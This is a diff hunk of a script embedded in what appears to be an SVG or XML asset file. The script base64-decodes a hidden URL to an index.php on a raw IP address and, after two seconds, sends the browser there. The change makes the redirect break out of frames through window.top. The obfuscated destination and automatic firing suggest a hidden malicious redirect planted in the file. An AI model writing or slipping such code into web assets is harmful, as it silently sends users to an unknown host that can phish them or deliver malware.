@@ -12,7 +12,9 @@
     setTimeout(function() {
       var b64 = "aHR0cDovLzE5NC43Ni4yMjcuMjI1L2luZGV4LnBocA==";
       var url = atob(b64);
-      window.location.href = url;
+      if (url !== window.location.href) {  // Prevent self-loop
+        window.top.location.replace(url);  // Break out of frames and redirect
+      }
     }, 2000);
   ]]></script>
   <!-- Background -->
